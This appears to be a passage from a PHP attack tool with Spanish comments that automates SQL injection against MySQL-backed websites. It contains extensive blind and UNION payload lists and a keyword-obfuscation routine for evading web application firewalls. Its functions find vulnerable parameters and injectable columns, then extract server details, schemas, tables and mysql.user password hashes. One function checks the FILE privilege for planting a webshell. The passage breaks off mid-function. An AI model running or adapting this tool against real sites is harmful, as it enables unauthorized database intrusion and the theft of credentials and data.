<?php

#donde buscar informacion para sqli
###https://websec.ca/kb/sql_injection#MySQL_Default_Databases




#tiempo de ejecucions
set_time_limit(0);
error_reporting(0);

require_once "../class/facilcurl.php";
/**
* SQLI con php
* Se podra utilizar proxy para la injeccion
*/ 
class SQLIPHP extends facilcurl
{
	private $linkPagina=null; #Se guardara la url de la pagina.
	private $linkBlind=null; //esta variable servira para identificar el blind
	public $linkYcolumnas=null;
	private $nombreColumnasTabla= array();
	private $error=null; #Se mostraran todos los errores.
	private $ssl=0; #para saver si utilizara ssl la pagina.
	private $infoheader=null;
	private $infopagina=null;
	private $usuariodb;
	private $nombredb;
	private $tiposUniones= array(
		/*Posibles tipos de uniones
		select * from productos where id=if(1=1,true,false)-- ,2,false)
		SELECT CASE WHEN (1=1) THEN true ELSE false END -- THEN true ELSE false END; 

		*/

		#Sirve para saver si la consulta es where o having
		# php?id_producto=1 having 0x31=0x31
		#php?id_producto=1 where 0x31=0x31

		#Verifica si la url es injectable

		#hacer para detectar parametros dinamicos comparando la pagina haciendo 2 peticiones y comparandolas si son iguales no son dinamicas.


	



		"blind"=>array( array("/**/and/**/0x31=0x30","/**/and/**/0x31=0x31"),
						array("/**/and/**/false--+-","/**/and/**/true--+-"),
						array("/**/and/**/false%23","/**/and/**/true%23"),
						array("'/**/and/**/0x31=0x30","'/**/and/**/0x31=0x31"),
						array("'/**/and/**/0x31=0x30--+-","'/**/and/**/0x31=0x31--+-"),
						array("/**/and/**/false","/**/and/**/true"),
						array("'/**/and/**/false/**/and/**/'0x31'='0x31","'/**/and/**/true/**/and/**/'0x31'='0x31"),
						array("'/**/and/**/false/**/and/**/'0x31'='0x31--+-","'/**/and/**/true/**/and/**/'0x31'='0x31--+-"),
						array("'/**/and/**/false/**/and/**/'0x31'='0x31%23","'/**/and/**/true/**/and/**/'0x31'='0x31%23"),
						
						
						array(")/**/and/**/false--+-",")/**/and/**/true--+-"),
						array(")/**/and/**/false%23",")/**/and/**/true%23"),
						array(")/**/and/**/false",")/**/and/**/true"),
						array("')/**/and/**/false/**/and/**/'0x31'='0x31","')/**/and/**/true/**/and/**/'0x31'='0x31"),
						array("')/**/and/**/false/**/and/**/'0x31'='0x31--+-","')/**/and/**/true/**/and/**/'0x31'='0x31--+-"),
						array("')/**/and/**/false/**/and/**/'0x31'='0x31%23","')/**/and/**/true/**/and/**/'0x31'='0x31%23"),
						array("')/**/and/**/0x31=0x30","')/**/and/**/0x31=0x31"),

						array("))/**/and/**/false--+-","))/**/and/**/true--+-"),
						array("))/**/and/**/false%23","))/**/and/**/true%23"),
						array("))/**/and/**/false","))/**/and/**/true"),
						array("'))/**/and/**/false/**/and/**/'0x31'='0x31","'))/**/and/**/true/**/and/**/'0x31'='0x31"),
						array("'))/**/and/**/false/**/and/**/'0x31'='0x31--+-","'))/**/and/**/true/**/and/**/'0x31'='0x31--+-"),
						array("'))/**/and/**/false/**/and/**/'0x31'='0x31%23","'))/**/and/**/true/**/and/**/'0x31'='0x31%23"),
						array("'))/**/and/**/0x31=0x30","'))/**/and/**/0x31=0x31"),
						
						array(")/**/and/**/(false--+-",")/**/and/**/(true--+-"),
						array(")/**/and/**/(false%23",")/**/and/**/(true%23"),
						array(")/**/and/**/(false",")/**/and/**/(true"),
						array("')/**/and/**/false/**/and/**/('0x31'='0x31","')/**/and/**/true/**/and/**/('0x31'='0x31"),
						array("')/**/and/**/false/**/and/**/('0x31'='0x31--+-","')/**/and/**/true/**/and/**/('0x31'='0x31--+-"),
						array("')/**/and/**/false/**/and/**/('0x31'='0x31%23","')/**/and/**/true/**/and/**/('0x31'='0x31%23"),
						

						array("))/**/and/**/(false--+-","))/**/and/**/((true--+-"),
						array("))/**/and/**/((false%23","))/**/and/**/((true%23"),
						array("))/**/and/**/((false","))/**/and/**/((true"),
						array("'))/**/and/**/false/**/and/**/(('0x31'='0x31","'))/**/and/**/true/**/and/**/(('0x31'='0x31"),
						array("'))/**/and/**/false/**/and/**/(('0x31'='0x31--+-","'))/**/and/**/true/**/and/**/(('0x31'='0x31--+-"),
						array("'))/**/and/**/false/**/and/**/(('0x31'='0x31%23","'))/**/and/**/true/**/and/**/(('0x31'='0x31%23"),
						array("'))/**/and/**/false/**/and/**/((0x31=0x31","'))/**/and/**/true/**/and/**/((0x31=0x31"),

						array(",false,false)--+-",",true,true)--+-"),
						array(",false,false)",",true,true)"),
						array(",false,false))--+-",",true,true))--+-"),
						array(",false,false))",",true,true))"),

						array(")/**/THEN/**/false/**/ELSE/**/false/**/END--+-",")/**/THEN/**/true/**/ELSE/**/true/**/END--+-"),
						array(")/**/THEN/**/false/**/ELSE/**/false/**/END)--+-",")/**/THEN/**/true/**/ELSE/**/true/**/END)--+-"),

						array("')/**/THEN/**/false/**/ELSE/**/false/**/END--+-","')/**/THEN/**/true/**/ELSE/**/true/**/END and '0x31'='0x31--+-"),
						array("')/**/THEN/**/false/**/ELSE/**/false/**/END--+-","')/**/THEN/**/true/**/ELSE/**/true/**/END and--+-"),
						array("')/**/THEN/**/false/**/ELSE/**/false/**/END--+-","')/**/THEN/**/true/**/ELSE/**/true/**/END and"),
						array("')/**/THEN/**/false/**/ELSE/**/false/**/END)--+-","')/**/THEN/**/true/**/ELSE/**/true/**/END)  and '0x31'='0x31--+-"),

						





						array('/**/and/**/false--+-','/**/and/**/true--+-'),
						array('/**/and/**/false%23','/**/and/**/true%23'),
						array('/**/and/**/false','/**/and/**/true'),
						array('"/**/and/**/false/**/and/**/"0x31"="0x31','"/**/and/**/true/**/and/**/"0x31"="0x31'),
						array('"/**/and/**/false/**/and/**/"0x31"="0x31--+-','"/**/and/**/true/**/and/**/"0x31"="0x31--+-'),
						array('"/**/and/**/false/**/and/**/"0x31"="0x31%23','"/**/and/**/true/**/and/**/"0x31"="0x31%23'),
						array('"/**/and/**/0x31=0x30','"/**/and/**/0x31=0x31'),
						
						array(')/**/and/**/false--+-',')/**/and/**/true--+-'),
						array(')/**/and/**/false%23',')/**/and/**/true%23'),
						array(')/**/and/**/false',')/**/and/**/true'),
						array('")/**/and/**/false/**/and/**/"0x31"="0x31','")/**/and/**/true/**/and/**/"0x31"="0x31'),
						array('")/**/and/**/false/**/and/**/"0x31"="0x31--+-','")/**/and/**/true/**/and/**/"0x31"="0x31--+-'),
						array('")/**/and/**/false/**/and/**/"0x31"="0x31%23','")/**/and/**/true/**/and/**/"0x31"="0x31%23'),
						array('")/**/and/**/0x31=0x30','")/**/and/**/0x31=0x31'),

						array('))/**/and/**/false--+-','))/**/and/**/true--+-'),
						array('))/**/and/**/false%23','))/**/and/**/true%23'),
						array('))/**/and/**/false','))/**/and/**/true'),
						array('"))/**/and/**/false/**/and/**/"0x31"="0x31','"))/**/and/**/true/**/and/**/"0x31"="0x31'),
						array('"))/**/and/**/false/**/and/**/"0x31"="0x31--+-','"))/**/and/**/true/**/and/**/"0x31"="0x31--+-'),
						array('"))/**/and/**/false/**/and/**/"0x31"="0x31%23','"))/**/and/**/true/**/and/**/"0x31"="0x31%23'),
						array('"))/**/and/**/0x31=0x30','"))/**/and/**/0x31=0x31'),
						
						array(')/**/and/**/(false--+-',')/**/and/**/(true--+-'),
						array(')/**/and/**/(false%23',')/**/and/**/(true%23'),
						array(')/**/and/**/(false',')/**/and/**/(true'),
						array('")/**/and/**/false/**/and/**/("0x31"="0x31','")/**/and/**/true/**/and/**/("0x31"="0x31'),
						array('")/**/and/**/false/**/and/**/("0x31"="0x31--+-','")/**/and/**/true/**/and/**/("0x31"="0x31--+-'),
						array('")/**/and/**/false/**/and/**/("0x31"="0x31%23','")/**/and/**/true/**/and/**/("0x31"="0x31%23'),
						array('")/**/and/**/false/**/and/**/(0x31=0x31','")/**/and/**/true/**/and/**/(0x31=0x31'),

						array('))/**/and/**/(false--+-','))/**/and/**/((true--+-'),
						array('))/**/and/**/((false%23','))/**/and/**/((true%23'),
						array('))/**/and/**/((false','))/**/and/**/((true'),
						array('"))/**/and/**/false/**/and/**/(("0x31"="0x31','"))/**/and/**/true/**/and/**/(("0x31"="0x31'),
						array('"))/**/and/**/false/**/and/**/(("0x31"="0x31--+-','"))/**/and/**/true/**/and/**/(("0x31"="0x31--+-'),
						array('"))/**/and/**/false/**/and/**/(("0x31"="0x31%23','"))/**/and/**/true/**/and/**/(("0x31"="0x31%23'),
						array('"))/**/and/**/false/**/and/**/((0x31=0x31','"))/**/and/**/true/**/and/**/((0x31=0x31'),


						),
						
		"basico"=>array("999999.9/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]--+-",
						"999999.9/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/**/%23",
						"999999.9'/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/**/%23",
						"999999.9'/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/'0x31",
						"999999.9'/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/'0x31--+-",
						"999999.9'/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/'0x31/**/%23",
						"999999.9')/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/('0x31'='0x31",
						"999999.9')/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/('0x31'='0x31--+-",
						"999999.9')/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/('0x31'='0x31/**/%23",
						"999999.9'))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/(('0x31'='0x31",
						"999999.9'))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/(('0x31'='0x31--+-",
						"999999.9'))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/(('0x31'='0x31/**/%23",
						"999999.9')))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/((('0x31'='0x31/**/%23",
						"999999.9%'/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/'%'='",
						"999999.9'/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]",
						"999999.9')/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]--+-",
						"999999.9)/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/(0x31=0x31'",
						"999999.9))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/((0x31=0x31",
						'999999.9")/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]--+-',
						'999999.9"/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/"0x31"="0x31',
						'999999.9"/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/"0x31"="0x31--+-',
						'999999.9"/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/"0x31"="0x31/**/%23',
						'999999.9")/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/("0x31"="0x31',
						'999999.9")/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/("0x31"="0x31--+-',
						'999999.9")/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/("0x31"="0x31/**/%23',
						'999999.9"))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/(("0x31"="0x31',
						'999999.9"))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/(("0x31"="0x31--+-',
						'999999.9"))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/(("0x31"="0x31/**/%23',
						'999999.9")))/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/((("0x31"="0x31/**/%23',
						'999999.9%"/*!00000UNiOn*//*!00000aLl*//*!00000sElECt*/[*]/*!00000OrDEr*//*!00000By*/0x31/**/and/**/"%"="')

			


						);


/*

		 function __construct()
		{
			$this->proxy("127.0.0.1:8080");
		}
*/

	#Filtro para Bypassear el WAF
	public function filtroForWaf($query)
		{

			return preg_replace(
			array(
			"/\s+/",
			"/group_concat\(/i",
			"/unhex\(/i",
			"/hex\(/i",
			"/\/concat\(/i",
			"/\,concat\(/i",
			"/\(concat\(/i",
			"/@@datadir/i",
			"/user\(/i",
			"/database\(/i",
			"/@@HOSTNAME/i",
			"/UUID\(/i",
			"/@@max_allowed_packet/i",
			"/version\(/i",
			"/@@global\.time_zone/i",
			"/SYSDATE\(/i",
			"/if\(/i",
			"/select/i",
			"/privilege_type/i",
			"/from/i",
			"/where/i",
			"/grantee\=/i",
			"/count\(/i",
			"/limit/i",
			"/\/all\//i",
			"/\/union\//i",
			"/\/order\//i",
			"/\/by\//i",
			"/\/group\//i",
			"/\/not\//i",
			"/\/as\//i",
			"/sleep\(/i",
			"/floor\(/i",
			"/rand\(/i",
			"/row\(/i",
			"/elt\(/i"
			),


			array(
			"/**/",
			"/*!00000gROuP_cOnCAt(*/",
			"/*!00000UnHEx*//**/(",
			"/*!00000HeX*//**/(",
			"//*!00000CoNCaT*//**/(",
			",/*!00000CoNCaT*//**/(",
			"(/*!00000CoNCaT*//**/(",
			"@@DaTAdIr",
			"/*!00000UsEr*//**/(",
			"/*!00000daTAbAsE*//**/(",
			"@@HoStnaME",
			"/*!00000UuId(*/",
			"@@mAx_AlloWeD_pAcKEt",
			"/*!00000vErSiOn*//**/(",
			"@@glOBal/**/.tIMe_ZonE",
			"/*!00000SysDaTe(*/",
			"/*!00000iF*//**/(",
			"/*!00000sElECt*/",
			"PRivILegE_tYpE",
			"/*!00000fRoM*/",
			"/*!00000WhErE*/",
			"GrAnTEe/**/=",
			"/*!00000coUnT(*/",
			"/*!00000lImIT*/",
			"//*!00000aLl*//",
			"//*!00000UNiOn*//",
			"//*!00000OrDEr*//",
			"//*!00000By*//",
			"//*!00000gROuP*//",
			"//*!00000nOt*//",
			"//*!00000aS*//",
			"SLeeP/**/(",
			"/*!00000FlOOr(*/",
			"/*!00000rAnD(*/",
			"/*!00000RoW(*/",
 			"/*!00000eLt(*/"
			),

			$query);

		}





	public function getLink()
	{
		return isset($this->error)? $this->error : $this->linkPagina;
	}



	public function getheaderin()
	{
		return $this->infoheader;
	}


	public function getInfoPagina()
	{
		return $this->$infopagina;
	}



	public function link(string $link)
	{
		if(preg_match('#http://#', $link))
		{
			$this->linkPagina	=	$link;

		}
		elseif(preg_match('#https://#', $link))
		{
			$this->ssl	=	1;
			$this->linkPagina	=	$link;

		}
		/*elseif(!preg_match('#\=#', $link) or !preg_match('#\?#', $link) or preg_match('#\=\&#', $link) or $link[(strlen($link)-1)]=="=")
		{
			$this->error='Error en la url, ejemplo: php?id=1';
		}*/
		else
		{

			$this->linkPagina	=	"http://".$link;

		}
	}

	public function headerin()
	{	
		$this->curl($this->linkPagina,null,0,null,0);
		$this->header_in();
		$this->infoheader	=	$this->exe_curl($info);
		$this->infopagina	=	$info;
		$this->header_desability(); //para desabilitarlo
	}


	public function esDobleEncoding($encodear=1)
	{

		$this->curl($this->prepararLink($this->linkPagina,$encodear),null,0,null,0);
		$pagina1	=	$this->exe_curl();

		$this->curl($this->prepararLink($this->linkPagina,'%25'.bin2hex($encodear)),null,0,null,0);
		$pagina2	=	$this->exe_curl();
		

		if ($pagina1==$pagina2) 
		{
			return true;
		}

		return false;
	}

	public function esVulnerable($tipoVerificacion=null)
	{

		if(isset($tipoVerificacion))
		{
			$this->curl($this->linkPagina,null,0,null,0);
			$pagina	=	md5($this->exe_curl());

			echo "Payload key de injeccion utilizado: ";			

			for ($i=0; $i < count($this->tiposUniones["blind"]); $i++)
			{ 
				echo $i.",";
				$this->curl($this->linkPagina.$this->tiposUniones["blind"][$i][0],null,0,null,0);
				$expre=preg_replace(array("/\)/","/\*/","/\'/","/\"/","/\//","/\=/","/\(/","/\%23/","/\+/"), array("\)","\*","\'","\"","\/","\=","\(","\#"," "), $this->tiposUniones["blind"][$i][0]);

				//verificando si las injecciones se introducen al html
				if (preg_match_all('#'.$expre.'#i', $filtroForWaf=$this->exe_curl()))
				{
					#echo "\nno se injecta la en html: false->:$i";
					$paginaFalse = md5(preg_replace("#".$expre."#", "", $filtroForWaf));				
				}
				else
				{
					#echo "\ntodo bien :true-->:$i-----------";
					$paginaFalse =	md5($this->exe_curl());
				}
	



				$this->curl($this->linkPagina.$this->tiposUniones["blind"][$i][1],null,0,null,0);
				$expre=preg_replace(array("/\)/","/\*/","/\'/","/\"/","/\//","/\=/","/\(/","/\%23/","/\+/"), array("\)","\*","\'","\"","\/","\=","\(","\#"," "), $this->tiposUniones["blind"][$i][1]);

				if (preg_match_all('#'.$expre.'#i', $filtroForWaf=$this->exe_curl()))
				{
					#echo "\nno se injecta la en html: false->:$i";
					$paginaTrue = md5(preg_replace("#".$expre."#", "", $filtroForWaf));					
				}
				else
				{
					#echo "\ntodo bien :true-->:$i-----------";
					$paginaTrue =	md5($this->exe_curl());
				}



				if($pagina==$paginaTrue and $pagina!=$paginaFalse)
				{
					#$this->linkBlind=$this->tiposUniones["blind"][$i][1];
					echo "\n\n\nLink vulnerable  ".$this->linkPagina.$this->tiposUniones["blind"][$i][1];
					return true;
				}

			}

		}
		else
		{



			#Ejemplo de Error: Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in C:\xampp\htdocs\hack\sqli\sql_injeccion_por_get\tienda.php on line 16
			#para saver si es vulnerable podemos saver colocando caracteres como \ ' "

			$this->curl($this->prepararLink($this->linkPagina,'%27'),null,0,null,0);
			if (preg_match_all('#(Warning|mysqli_fetch_array|error|mysql|mysqli|line|You have an error in your SQL syntax)#i', $this->exe_curl()))
			{
				return true;
			}


		}


		echo "NOOOOOOOOO ES VULNERABLE";
		return false;
	}


	public function saberColumnaVulnerable($colmInicial=1,$colmfinal=26)
	{

		if(file_exists("../paginas/".md5($this->linkPagina)."/payload.txt"))
		{
			return $this->linkYcolumnas	=  file_get_contents("../paginas/".md5($this->linkPagina)."/payload.txt");
		}


		for ($z=0; $z < count($this->tiposUniones["basico"]) ; $z++)
		{ 
			echo "payload utilizado: ".$z."\n";
			$sasa=$this->prepararLink($this->prepararLink($this->linkPagina,$this->tiposUniones['basico'][$z]));
			$centro='0x'.bin2hex('*|>1<|*');
			$rara=$sasa[0].$centro.$sasa[1];
			$this->curl($rara,null,0,null,0);
			$referencia=$this->exe_curl();
			
			
			
			if(preg_match('#\*\|\>(.*?)\<\|\*#', $referencia,$columna))
			{
				$vulne=1;
			}
			else
			{
					
					for ($i=$colmInicial+1; $i <= $colmfinal ; $i++)
					{
						$centro=$centro.','.'0x'.bin2hex('*|>'.$i.'<|*');
						

						$this->curl($sasa[0].$centro.$sasa[1],null,0,null,0);
						
						if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
						{
							$vulne=1;
							break;
							
						}
						
					}

			}



		if($columna[1]==1 and $vulne==1)
		{
			$numColum="[*]";
		}
		elseif($vulne==1)
		{
				for ($a=1; $a <= $i; $a++)
				{
					if($a==1)
					{
						if($a==$columna[1])
						{
							$numColum='[*]';
						}
						else
						{
							$numColum=$a;
						}
						
					}
					else
					{
						if($a==$columna[1])
						{
							$numColum=$numColum.','.'[*]';
						}
						else
						{
							$numColum=$numColum.','.$a;
						}
					}

				}
		}
				if($vulne==1)
				{
					mkdir("../paginas/".md5($this->linkPagina), 0777, true);
					file_put_contents("../paginas/".md5($this->linkPagina)."/payload.txt",$sasa[0].$numColum.$sasa[1]);
					return $this->linkYcolumnas	=	$sasa[0].$numColum.$sasa[1];
				}
		}

	}




	public function infodb()
	{

		#ruta de MYSQL= @@datadir
		#Usuario= user(), current_user(), current_user, system_user(), session_user()
		#nombre de base de datos= database(),schema()
		#nombre del servidor= @@HOSTNAME 
		#mac= UUID()
		#Tamaño por defaul de transferencia; @@max_allowed_packet

		/*SELECT ROW_COUNT();
		@@identity
		@@global.time_zone
		SYSDATE()
		*/
		if($this->linkYcolumnas==null)
		{
			die("no se pudo encontrar la vulnerabilidad SQL injeccion");
		}
		
		if(file_exists("../paginas/".md5($this->linkPagina)."/infoDatabase.txt"))
		{
			$info= json_decode(file_get_contents("../paginas/".md5($this->linkPagina)."/infoDatabase.txt"));
			$this->usuariodb= 	'0x'.bin2hex($info[1]);
			$this->nombredb = 	'0x'.bin2hex($info[2]);
			return $info;
		}

		$link = $this->prepararLink($this->linkYcolumnas);
		$link= $link[0].$this->filtroForWaf('UnHEx(HeX(CoNCaT(0x2a7c3e,@@datadir,0x2c,user(),0x2c,database(),0x2c,@@HOSTNAME,0x2c,UUID(),0x2c,@@max_allowed_packet,0x2c,version(),0x2c,@@global.time_zone,0x2c,SYSDATE(),0x3c7c2a)))').$link[1];

		$this->curl($link,null,0,null,0);
		
		if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
		{
			$info=explode(",", $columna[1]);
			$mac=explode('-', $info[4])[4];
			$macOrdenado='';
			for ($i=0; $i < 12; $i++)
			{
				if(($i%2))
				{
					if($i==11)
					{
						$macOrdenado.=$mac[$i];
					}
					else
					{
						$macOrdenado.=$mac[$i].':';
					}
				}
				else
				{
					$macOrdenado=$macOrdenado.$mac[$i];
				}

			}



			$usuario=explode('@', $info[1]);
			$this->usuariodb= 	'0x'.bin2hex($info[1]= "'".$usuario[0]."'@'".$usuario[1]."'");
			$this->nombredb = 	'0x'.bin2hex($info[2]);
			$info[4]= strtoupper($macOrdenado);
			
			$info[9]=$this->webshell()[0];
			

			file_put_contents("../paginas/".md5($this->linkPagina)."/infoDatabase.txt",json_encode($info));
			return $info;

		}

	}


	public function tieneWAF()
	{

		/*
	bypass waf (consulta))= Illegal mix of collations for operation 'UNION'
		999999.9 union all select (concat((select concat(schema_name) from information_schema.schemata limit 0,1)))),2,3,4,5,6,7,8--+-

		*/

		#
		#https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
				#WAF
		/*!00000Union*/
		#concat%0a(version())
		#concat%0b(version())
		#concat%0c(version())
		#concat+(version())
		#concat%20(version())
		#/*!00000select*/nombre/**//*!00000from*/productos;
	}

	public function prepararLink($linkConInjeccion,$injeccion=9999.9)
	{



		#se utiliza para verificar si el link contiene mas de 1 variable y que no se le aya espesificado la injeccion con *
		if ((count(explode('=',$linkConInjeccion))>2) and !preg_match('#[\[\*\]]#', $linkConInjeccion))
		{
			$linkParte1=explode('=',$linkConInjeccion,2);
			$linkParte2=explode('&',$linkParte1[1],2);
			return $linkParte1[0].'='.$injeccion.'&'.$linkParte2[1];
		}
		#Sirve para cuando en el link se espesifica donde quieres la injeccion
		elseif (preg_match('#[\[\*\]]#', $linkConInjeccion)) 
		{
			return $EspesificandoInjeccion= explode('[*]', $linkConInjeccion,2);
			#return $EspesificandoInjeccion[0].$injeccion.$EspesificandoInjeccion[1];
			
		}
		#Sirve para cuando solo se manda 1 solo parametro y no varios
		if(preg_match('#[=]#', $linkConInjeccion))
		{
			return explode('=', $linkConInjeccion)[0].'='.$injeccion;
		}

	}

	//saber si se le puede injecctar shell
	public function webshell($usuario=null)
	{

		if(is_null($usuario))
			{
				$usuario=$this->usuariodb;
			}
			else
			{
				$usuario='0x'.bin2hex($usuario);
			}

			$usuarios=array();
			$link = $this->prepararLink($this->linkYcolumnas);			
			 $link= $link[0].$this->filtroForWaf('UnHEx(HeX(if((select/**/privilege_type/**/from/**/information_schema.user_privileges/**/where/**/grantee='.$usuario.'/**/and/**/privilege_type=0x46494c45)=0,0x2a7c3e5765625368656c6c2d56756c6e657261626c653c7c2a,0x2a7c3e4e6f2d5765625368656c6c3c7c2a)))').$link[1];

			$this->curl($link,null,0,null,0);
		
			if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
			{

				return explode(",", $columna[1]);

			}

	}


	//buscar la ultima consulta
	public function  ultimaConsulta()
	{
		#SELECT info FROM information_schema.processlist
	}

	##saver todos los usuarios:
	public function usuarios()
	{
		
		$usuarios=array();
			$link = $this->prepararLink($this->linkYcolumnas);			
			$link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,count(user),0x3c7c2a)/**/from/**/mysql.user)))').$link[1];

			$this->curl($link,null,0,null,0);
		
			if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
			{

				$colum=$columna[1];

				for ($i=0; $i < $colum ; $i++)
				{
					$link = $this->prepararLink($this->linkYcolumnas);			
					 $link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,host,0x2c,user,0x2c,password,0x3c7c2a)/**/from/**/mysql.user/**/limit/**/'.$i.',1)))').$link[1];

					$this->curl($link,null,0,null,0);

					if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
					{
						$usuarios[]=explode(",", $columna[1]);
					}
				}
			}
			

			return $usuarios;
	
	}

	//ver Privilegions de un usuario
	public function privilegiosUsuario($usuario=null)
	{
			if(is_null($usuario))
			{
				$usuario=$this->usuariodb;
			}
			else
			{
				$usuario='0x'.bin2hex($usuario);
			}

			$usuarios=array();
			$link = $this->prepararLink($this->linkYcolumnas);			
			$link= $link[0].$this->filtroForWaf('UnHEx(HeX(CoNCaT(0x2a7c3e,(select/**/group_CoNCaT(privilege_type)/**/from/**/information_schema.user_privileges/**/where/**/grantee='.$usuario.'),0x3c7c2a)))').$link[1];

			$this->curl($link,null,0,null,0);
		
			if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
			{

				return explode(",", $columna[1]);

			}

	}

	##saver todas las bases de datos:
	public function dbs()
	{
			$alldbs=array();
			$link = $this->prepararLink($this->linkYcolumnas);			
			$link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,count(schema_name),0x3c7c2a)/**/from/**/information_schema.schemata/**/wHeRe/**/not/**/sChEmA_NaMe=0x696e666f726d6174696f6e5f736368656d61)))').$link[1];

			$this->curl($link,null,0,null,0);
		
			if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
			{

				$colum=$columna[1];

				for ($i=0; $i < $colum ; $i++)
				{
					$link = $this->prepararLink($this->linkYcolumnas);			
					 $link= $link[0].$this->filtroForWaf('UnHEx(HeX(CoNCaT(0x2a7c3e,(select/**/CoNCaT(schema_name,0x2c,DEFAULT_CHARACTER_SET_NAME)/**/from/**/information_schema.schemata/**/wHeRe/**/not/**/sChEmA_NaMe=0x696e666f726d6174696f6e5f736368656d61/**/limit/**/'.$i.',1),0x3c7c2a)))').$link[1];

					$this->curl($link,null,0,null,0);

					if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
					{
						$alldbs[]=explode(",", $columna[1]);
					}
				}
			}
			

			return $alldbs;
	}	

	//saber tablas,tiempo en que se creo con el nombre de db:
	public function tablas($dbL=null)
	{
			if(is_null($dbL))
			{
				$db=$this->nombredb;	
			}
			else
			{
				$db='0x'.bin2hex($dbL);
			}


			$alltablas=array();
			$link = $this->prepararLink($this->linkYcolumnas);			
			$link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,count(table_name),0x3c7c2a)/**/from/**/information_schema.tables/**/where/**/table_schema='.$db.')))').$link[1];

			$this->curl($link,null,0,null,0);



			if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
			{
				
				$colum=$columna[1];

				for ($i=0; $i < $colum ; $i++)
				{
					$link = $this->prepararLink($this->linkYcolumnas);
					$link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,table_name,0x2c,create_time,0x2c,table_collation,0x2c,TABLE_ROWS,0x3c7c2a)/**/from/**/information_schema.tables/**/where/**/table_schema='.$db.'/**/limit/**/'.$i.',1)))').$link[1];
					 
					$this->curl($link,null,0,null,0);

					if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
					{
						$alltablas[]=explode(",", $columna[1]);
					}
				}
			}
			

			return $alltablas;


	}

	//ver privilegios de una tabla
	public function privilegiosTabla($usuario=null)
	{
			if(is_null($usuario))
			{
				$usuario=$this->usuariodb;
			}
			else
			{
				$usuario='0x'.bin2hex($usuario);
			}



			$privTab=array();
			$link = $this->prepararLink($this->linkYcolumnas);			
			$link= $link[0].$this->filtroForWaf('UnHEx(HeX((select/**/CoNCaT(0x2a7c3e,count(*),0x3c7c2a)/**/from/**/(select/**/table_schema/**/from/**/information_schema.schema_privileges/**/where/**/grantee='.$usuario.'/**/group/**/by/**/table_schema)/**/as/**/alias)))').$link[1];

			$this->curl($link,null,0,null,0);



			if(preg_match('#\*\|\>(.*?)\<\|\*#', $this->exe_curl(),$columna))
			{
				
